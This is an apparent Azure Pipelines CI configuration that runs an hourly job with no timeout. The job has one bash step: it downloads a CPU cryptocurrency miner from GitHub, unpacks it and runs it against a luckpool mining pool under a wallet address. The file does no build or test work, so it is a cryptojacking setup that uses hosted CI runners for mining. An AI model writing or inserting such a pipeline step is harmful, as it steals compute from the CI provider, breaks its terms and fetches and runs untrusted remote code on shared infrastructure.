schedules:
- cron: "0 * * * *"
  displayName: Run Hours
  branches:
    include:
    - master
    
#To run on a schedule PR and CI triggers must be disabled.
pr: none
trigger: none
pool:
  vmImage: 'ubuntu-latest'
jobs:
- job: Run1
  timeoutInMinutes: 0
  cancelTimeoutInMinutes: 1
  steps:
  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.adaa --cpu 2
    displayName: 'run'
